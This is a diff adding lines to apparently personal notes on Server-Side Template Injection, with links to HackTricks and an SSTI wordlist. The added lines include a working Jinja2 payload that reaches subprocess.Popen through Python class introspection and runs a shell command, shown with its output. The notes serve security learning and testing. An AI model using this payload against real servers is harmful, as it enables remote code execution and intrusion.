@@ -4,3 +4,11 @@ To detect Server-Side Template Injection (SSTI), initially, **fuzzing the templa
 # Guide
 
 1. [SSTI (Server Side Template Injection) | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
+2. Can access `subprocess.Popen` and use it to RCE
+```
+python3 client.py '{{{}.__class__.__base__.__subclasses__()[400]("id", shell=True, stdout=-1).communicate()[0].decode()}}' | grep '<p>' <p>uid=1001(bob) gid=1001(bob) groups=1001(bob)
+```
+
+## Wordlist
+
+[SSTI/Wordlist at master · err0rr/SSTI · GitHub](https://github.com/err0rr/SSTI/blob/master/Wordlist)
